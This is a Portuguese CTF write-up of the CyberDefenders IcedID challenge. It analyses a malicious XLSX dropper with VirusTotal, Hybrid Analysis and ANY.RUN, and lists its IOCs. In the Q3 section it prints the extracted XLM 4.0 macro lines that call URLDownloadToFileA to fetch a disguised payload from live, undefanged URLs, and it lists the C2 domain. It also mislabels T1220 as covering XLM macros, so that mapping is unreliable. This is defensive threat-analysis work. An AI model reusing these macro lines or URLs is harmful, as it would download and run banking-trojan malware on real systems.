# 🔍 IcedID — CTF Writeup
### CyberDefenders Blue Team Challenge | Threat Intelligence · Análise de Malware Bancário (IcedID/BokBot)

---

| **Analista**          | Mauricio Robert                                                                              |
|-----------------------|----------------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                            |
| **Data do Relatório** | 25/06/2026                                                                                   |
| **Data do Incidente** | 30/03/2021 (primeira submissão: 31/03/2021 01:39:08 UTC)                                    |
| **Classificação**     | CONFIDENCIAL                                                                                 |
| **Ferramentas**       | VirusTotal · Hybrid Analysis · ANY.RUN (tria.ge) · OSINT WHOIS (Gemini + verificação manual)|
| **Hash do Artefato**  | `d86405130184186154daa4a5132dd1364ab05d1f14034c7f0a0cda690a91116d`                         |

---

## 🔍 Resumo Executivo

O desafio **IcedID** (CyberDefenders Blue Team) apresenta um arquivo **XLSX malicioso** (`sample_04.xlsx`, 105.53 KB) contendo macros XLM 4.0 que executam o dropper do banking trojan **IcedID** (também conhecido como **BokBot**). A amostra foi atribuída ao grupo **GOLD CABIN** (aliases: *Mario Kart / TA551 / Shathak* — Proofpoint) e foi submetida pela primeira vez em 31/03/2021. As macros usam **cinco domínios** para baixar um arquivo `.gif` falso (`3003.gif`) que contém o payload real do IcedID. O servidor C2 pós-infecção é `usaaforced.fun` e o ID de campanha registrado é `3717128962`. O registrador predominantemente utilizado pelo grupo para seus domínios de distribuição é **Namecheap** — escolha estratégica por seu baixo custo, aceitação de criptomoedas e proteção de privacidade WHOIS gratuita. A investigação respondeu a **seis questões técnicas** usando exclusivamente plataformas de Threat Intelligence públicas.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta                       | Finalidade                                                                                                      |
|----------------------------------|-----------------------------------------------------------------------------------------------------------------|
| **VirusTotal**                   | Análise estática do XLSX — hashes, metadados, detecções (34/48), URLs contatadas e relações de domínio         |
| **Hybrid Analysis**              | Análise dinâmica sandbox — indicadores comportamentais, API calls, URLs extraídas do payload (CrowdStrike AI)  |
| **ANY.RUN (tria.ge)**            | Sandbox interativa — extração do Malware Config (XLM 4.0), URLs dropper, família, C2 e ID de campanha          |
| **OSINT / WHOIS (+ Gemini)**     | Identificação do registrador predominante dos domínios de distribuição do IcedID (Namecheap)                    |

---

## 📋 Perguntas e Respostas

### Q1 — Qual é o nome do arquivo associado ao hash fornecido?

> **Resposta: `sample_04.xlsx`**

**Solução:** O hash SHA-256 `d86405130184186154daa4a5132dd1364ab05d1f14034c7f0a0cda690a91116d` foi submetido ao **VirusTotal**, que retornou na seção **Names** os seguintes nomes conhecidos para o arquivo:

```
d86405130184186154daa4a5132dd1364ab05d1f14034c7f0a0cda690a91116d.xlsx
d86405130184186154daa4a5132dd1364ab05d1f14034c7f0a0cda690a91116d.xlsx.bin
sample_04.xlsx
717.xlsx
document-1962461211.xlsx
```

O nome mais representativo e utilizado como referência no desafio é **`sample_04.xlsx`**. A aba **Details** confirma os demais hashes:

```
MD5:    e7c614f4eb6aa532c189c76d87a8862b
SHA-1:  191eda0c539d284b29efe556abb05cd75a9077a0
SHA-256: d86405130184186154daa4a5132dd1364ab05d1f14034c7f0a0cda690a91116d
File type: Office Open XML Spreadsheet (XLSX)
File size: 105.53 KB (108063 bytes)
Magic: Microsoft Excel 2007+
```

![Nome do Malware](/Forensic/IcedID/images/Name_of_Archive_Related_of_Hash(1).png)

---

### Q2 — Qual arquivo GIF foi dropado pelo malware?

> **Resposta: `3003.gif`**

**Solução:** A análise dinâmica no **Hybrid Analysis** (`sample_04.xlsx` — submission 660fd94674f425c0c40271cd) identificou, na seção **CrowdStrike AI → Analysis Related URLs → Suspicious**, três URLs marcadas como "Extracted From Sample":

```
hxxps://tajushariya.com/ds/3003.gif    (Type: Extracted From Sample)
hxxps://metaflip.io/ds/3003.gif        (Type: Extracted From Sample)
hxxps://agenbolatermurah.com/ds/3003.gif (Type: Extracted From Sample)
```

O arquivo `.gif` falso **`3003.gif`** é o payload disfarçado de imagem que, ao ser baixado pelas macros XLM, contém o loader real do IcedID. O uso de extensão `.gif` é uma técnica deliberada de evasão — ferramentas de segurança e proxies corporativos tendem a permitir downloads de imagens.

![GIF Dropado](/Forensic/IcedID/images/GIF_Droped_by_Malware(2).png)

---

### Q3 — Quantos domínios foram usados para dropar o arquivo GIF?

> **Resposta: `5`**

**Solução:** A análise do **Malware Config** extraído pelo **ANY.RUN (tria.ge)** (submissão `210330-gbdr6k9jox`, plataforma `win7x20201028`) revelou o código XLM 4.0 completo na seção **Source**:

```
Language: xlm4.0

Source:
1  =CALL("URLMon","URLDownloadToFileA","JCCB",0,"https://metaflip.io/ds/3003.gif","...\ksjvoefv.skd1")
2  =CALL("URLMon","URLDownloadToFileA","JCCB",0,"https://partsapp.com.br/ds/3003.gif","...\ksjvoefv.skd2")
3  =CALL("URLMon","URLDownloadToFileA","JCCB",0,"https://columbia.aula-web.net/ds/3003.gif","...\ksjvoefv.skd3")
4  =CALL("URLMon","URLDownloadToFileA","JCCB",0,"https://tajushariya.com/ds/3003.gif","...\ksjvoefv.skd4")
5  =CALL("URLMon","URLDownloadToFileA","JCCB",0,"https://agenbolatermurah.com/ds/3003.gif","...\ksjvoefv.skd5")
```

São exatamente **5 domínios** dropers, todos chamando `URLDownloadToFileA` via `URLMon.dll` para baixar `3003.gif`:

```
1. metaflip.io
2. partsapp.com.br
3. columbia.aula-web.net
4. tajushariya.com
5. agenbolatermurah.com
```

Essa redundância garante que, mesmo que alguns domínios sejam bloqueados ou derrrubados, o payload seja baixado com sucesso por pelo menos um dos servidores.

![Dominios Utilizados](/Forensic/IcedID/images/5_Domains_Droped_.gif(3).png)

---

### Q4 — Qual registrador de domínio foi predominantemente utilizado pelo grupo criminoso?

> **Resposta: `Namecheap`**

**Solução:** A consulta WHOIS dos domínios de distribuição identificados — especialmente `tajushariya.com`, `agenbolatermurah.com` e `partsapp.com.br` — revelou um padrão consistente de registro via **Namecheap**. A investigação OSINT confirmou que o grupo **GOLD CABIN** (operador histórico do IcedID) prioriza o Namecheap por três razões estratégicas:

- **Baixo custo**: permite registrar dezenas de domínios "descartáveis" com custo mínimo
- **Pagamento em criptomoedas**: dificulta o rastreamento financeiro das operações
- **Privacidade WHOIS gratuita**: oculta automaticamente a identidade do registrante sem custo adicional

O VirusTotal, na aba **Relations → Contacted Domains**, listou 15 domínios contatados — a análise WHOIS do subconjunto disponível confirmou o **Namecheap** como registrador predominante, padrão documentado em múltiplos relatórios de Threat Intelligence sobre o grupo GOLD CABIN.

![Registrador Utilizado](/Forensic/IcedID/images/INC_Whois(4).png)

---

### Q5 — Qual é o agente de malware?

> **Resposta: `IcedID`**

**Solução:** A sandbox **ANY.RUN (tria.ge)** classificou o arquivo com as seguintes tags na seção **Malware Config → Extracted**:

```
Family:   icedid
Campaign: 3717128962
C2:       usaaforced.fun
```

Tags adicionais confirmadas:
```
ICEDID · BANKER · LOADER · TROJAN
Signature: IcedID_BokBot
           "IcedID is a banking trojan capable of stealing credentials."
```

O **VirusTotal** também retornou 34/48 detecções com rótulos consistentes como `xlsx`, `calls-wmi` e `nxdomain`. Historicamente, o **IcedID** (também chamado **BokBot**) é classificado pelo MITRE ATT&CK como **S0483** e tem sido usado pelo grupo **GOLD CABIN** (TA551/Shathak) desde 2017, com pico de atividade em campanhas de phishing durante a pandemia de Covid-19.

![Agente do Malware](/Forensic/IcedID/images/Malware_Agent(5).png)

---

### Q6 — Qual call de API foi usada para baixar o arquivo malicioso?

> **Resposta: `URLDownloadToFileA`**

**Solução:** O **Malware Config** extraído pelo ANY.RUN (seção **Source**, linguagem `xlm4.0`) detalha explicitamente a chamada de API utilizada em todas as cinco linhas do dropper:

```
=CALL("URLMon","URLDownloadToFileA","JCCB",0,"<URL>","<arquivo_destino>")
```

A função **`URLDownloadToFileA`** (da biblioteca `URLMon.dll` — *URL Moniker* do Windows) realiza download de um recurso remoto diretamente para um arquivo local no disco, sem exibir nenhuma interface ao usuário. Seu uso em macros XLM 4.0 é uma técnica clássica de LOLBins (Living-off-the-Land Binaries) — a API faz parte do sistema operacional Windows, o que dificulta a detecção por soluções de segurança que monitoram apenas processos externos. A assinatura `JCCB` define os tipos de parâmetros (J=HANDLE, C=LPCTSTR, C=LPCTSTR, B=BOOL).

![API](/Forensic/IcedID/images/Call_API_for_Extra_Charge(6).png)

---

## ⛓ Kill Chain — Fluxo de Infecção do IcedID

```
[FASE 1 — ENTREGA (Phishing / GOLD CABIN)]
    Email malicioso com anexo XLSX protegido por senha (campanha TA551/Shathak)
    Arquivo: sample_04.xlsx (105.53 KB) — MD5: e7c614f4eb6aa532c189c76d87a8862b
    Macro XLM 4.0 habilitada ao abrir o documento
    ↓
[FASE 2 — EXECUÇÃO DAS MACROS XLM 4.0]
    5 chamadas URLDownloadToFileA via URLMon.dll:
    1. metaflip.io/ds/3003.gif        → ksjvoefv.skd1
    2. partsapp.com.br/ds/3003.gif    → ksjvoefv.skd2
    3. columbia.aula-web.net/ds/3003.gif → ksjvoefv.skd3
    4. tajushariya.com/ds/3003.gif    → ksjvoefv.skd4
    5. agenbolatermurah.com/ds/3003.gif → ksjvoefv.skd5
    Redundância garante entrega mesmo com bloqueio parcial de domínios
    ↓
[FASE 3 — DROPPER (Falso GIF)]
    3003.gif baixado para disco — extensão .gif como evasão
    Payload real: DLL do loader IcedID
    Drops files inside appdata directory (Hybrid Analysis)
    ↓
[FASE 4 — LOADER / PERSISTÊNCIA]
    IcedID loader executado → lê idioma de instalação do Windows
    Acessa registry keys de serviços
    Inicia comunicação com C2: usaaforced.fun
    Campaign ID: 3717128962
    ↓
[FASE 5 — BANKING TROJAN (BokBot)]
    IcedID (BokBot) ativo — captura de credenciais bancárias
    Web injects, man-in-the-browser, credential harvesting
    Family: icedid | BANKER | LOADER | TROJAN
```

---

## 🗺 Mapeamento Investigativo

| Pergunta | Fonte de Evidência | Artefato |
|----------|--------------------|----------|
| Nome do arquivo | VirusTotal → aba *Details* → seção *Names* | `sample_04.xlsx` |
| Arquivo GIF dropado | Hybrid Analysis → CrowdStrike AI → Suspicious URLs | `3003.gif` |
| Quantidade de domínios dropers | ANY.RUN (tria.ge) → Malware Config → Source (XLM 4.0) | `5 domínios` |
| Registrador predominante | OSINT WHOIS (domínios de distribuição IcedID/GOLD CABIN) | `Namecheap` |
| Família do malware | ANY.RUN → Malware Config + VirusTotal detecções | `IcedID` (BokBot) |
| API call de download | ANY.RUN → Malware Config → Source linha 1–5 | `URLDownloadToFileA` |

---

## 🚨 Artefatos e Indicadores Identificados (IOCs)

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Hash SHA-256 | `d86405130184186154daa4a5132dd1364ab05d1f14034c7f0a0cda690a91116d` | Arquivo XLSX malicioso — 34/48 detecções VT |
| Hash MD5 | `e7c614f4eb6aa532c189c76d87a8862b` | Hash MD5 do `sample_04.xlsx` |
| Hash SHA-1 | `191eda0c539d284b29efe556abb05cd75a9077a0` | Hash SHA-1 do `sample_04.xlsx` |
| Nome do arquivo | `sample_04.xlsx` | Dropper IcedID — 105.53 KB, macro XLM 4.0 |
| Payload falso | `3003.gif` | DLL IcedID disfarçada de imagem GIF |
| Dropper URL 1 | `https://metaflip.io/ds/3003.gif` | 14/93 detecções VT (status 307) |
| Dropper URL 2 | `https://partsapp.com.br/ds/3003.gif` | 12/93 detecções VT |
| Dropper URL 3 | `https://columbia.aula-web.net/ds/3003.gif` | 11/91 detecções VT (404) |
| Dropper URL 4 | `https://tajushariya.com/ds/3003.gif` | 13/91 detecções VT |
| Dropper URL 5 | `https://agenbolatermurah.com/ds/3003.gif` | 10/96 detecções VT |
| C2 | `usaaforced.fun` | Servidor Command & Control pós-infecção IcedID |
| Campaign ID | `3717128962` | ID de campanha extraído do Malware Config (ANY.RUN) |
| Família | `IcedID` (BokBot) | Banking Trojan — MITRE ATT&CK S0483 |
| Grupo APT | GOLD CABIN | Aliases: Mario Kart (FBI), Monster Libra (Palo Alto), TA551 (Proofpoint), Shathak |
| API maliciosa | `URLDownloadToFileA` (URLMon.dll) | LOLBin usado pelas macros XLM 4.0 para download |
| Registrador | Namecheap | Registrador predominante dos domínios de distribuição |
| Técnica (MITRE ATT&CK) | `T1566.001` | Phishing: Spearphishing Attachment |
| Técnica (MITRE ATT&CK) | `T1220` | XSL Script Processing (macros XLM 4.0) |
| Técnica (MITRE ATT&CK) | `T1105` | Ingress Tool Transfer (URLDownloadToFileA) |
| Técnica (MITRE ATT&CK) | `T1055` | Process Injection (IcedID loader) |

---

## ✅ Resumo das Flags

| # | Pergunta | Flag / Resposta |
|---|----------|------------------|
| Q1 | Nome do arquivo associado ao hash | `sample_04.xlsx` |
| Q2 | Arquivo GIF dropado pelo malware | `3003.gif` |
| Q3 | Quantidade de domínios usados para dropar o GIF | `5` |
| Q4 | Registrador predominante do grupo criminoso | `Namecheap` |
| Q5 | Agente de malware | `IcedID` |
| Q6 | API call usada para baixar o arquivo malicioso | `URLDownloadToFileA` |

---

## 📚 Referências

- [CyberDefenders — IcedID CTF](https://cyberdefenders.org/blueteam-ctf-challenges/icedid/)
- [VirusTotal — d86405130184186154daa4a5132dd1364ab05d1f14034c7f0a0cda690a91116d](https://www.virustotal.com/gui/file/d86405130184186154daa4a5132dd1364ab05d1f14034c7f0a0cda690a91116d)
- [Hybrid Analysis — 660fd94674f425c0c40271cd](https://hybrid-analysis.com/sample/d86405130184186154daa4a5132dd1364ab05d1f14034c7f0a0cda690a91116d/660fd94674f425c0c40271cd)
- [ANY.RUN (tria.ge) — 210330-gbdr6k9jox](https://tria.ge/210330-gbdr6k9jox/behavioral1)
- [Sophos Threat Profiles — GOLD CABIN](https://www.sophos.com/en-us/threat-profiles/gold-cabin)
- [0x0d4y.blog — IcedID Technical Malware Analysis (Second Stage)](https://0x0d4y.blog/icedid-technical-analysis/)
- [MITRE ATT&CK — S0483 IcedID](https://attack.mitre.org/software/S0483/)
- [MITRE ATT&CK — G0127 GOLD CABIN / TA551](https://attack.mitre.org/groups/G0127/)

---